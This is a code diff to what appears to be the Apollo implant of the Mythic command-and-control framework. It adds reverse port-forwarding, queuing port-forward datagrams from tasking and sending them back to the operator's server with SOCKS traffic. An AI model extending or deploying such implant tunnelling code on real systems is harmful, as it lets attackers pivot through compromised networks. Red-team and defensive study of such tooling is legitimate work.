@@ -1,4 +1,4 @@
-﻿#define COMMAND_NAME_UPPER
+#define COMMAND_NAME_UPPER
 
 #if DEBUG
 #undef MAKE_TOKEN
@@ -39,6 +39,7 @@ using static Utils.DebugUtils;
 using static Utils.StringUtils;
 using Apollo.Tasks;
 using Apollo.SocksProxy;
+using Apollo.RPortFwdProxy;
 using Mythic.Structs;
 using Newtonsoft.Json;
 using Apollo.MessageInbox;
@@ -301,12 +302,28 @@ namespace Apollo
             //DebugWriteLine($"Finished processing {dgs.Length} SocksDatagrams!");
         }
 
+        public void DispatchPortFwdDatagrams(PortFwdDatagram[] dgs)
+        {
+            //DebugWriteLine($"Datagram #{i + 1} is of length: {System.Convert.FromBase64String(dgs[i].data).Length}");
+            for (int i = 0; i < dgs.Length; i++)
+            {
+                //DebugWriteLine($"Datagram #{i + 1} is of length: {System.Convert.FromBase64String(dgs[i].data).Length}");
+                RPortFwdController.AddDatagramToQueue(dgs[i]);
+            }
+            //DebugWriteLine($"Finished processing {dgs.Length} SocksDatagrams!");
+        }
+
         public void DispatchTaskQueue(Mythic.Structs.TaskQueue tasks)
         {
 
             if (tasks.SocksDatagrams != null && tasks.SocksDatagrams.Length > 0)
             {
                 DispatchSocksDatagrams(tasks.SocksDatagrams);
+            }
+
+            if (tasks.PortFwdDg != null)
+            {
+                DispatchPortFwdDatagrams(tasks.PortFwdDg);
             }
 
             if (tasks.Tasks.Length != 0)
@@ -371,6 +388,7 @@ namespace Apollo
         {
             int retryCount = 0;
             Tasks.ApolloTaskResponse[] responses = JobManager.GetJobOutput();
+            PortFwdDatagram[] rdatagrams = RPortFwdController.GetMythicMessagesFromQueue();
             SocksDatagram[] datagrams = SocksController.GetMythicMessagesFromQueue();
             List<ApolloTaskResponse> lResponses = new List<ApolloTaskResponse>(); // probably should be used to resend
             if (responses.Length > 0 || datagrams.Length > 0)
@@ -378,7 +396,7 @@ namespace Apollo
                 string guid = Guid.NewGuid().ToString();
                 while (retryCount < MAX_RETRIES)
                 {
-                    string result = Profile.SendResponses(guid, responses, datagrams);
+                    string result = Profile.SendResponses(guid, responses, datagrams,rdatagrams);
                     if (string.IsNullOrEmpty(result))
                     {
                         break;
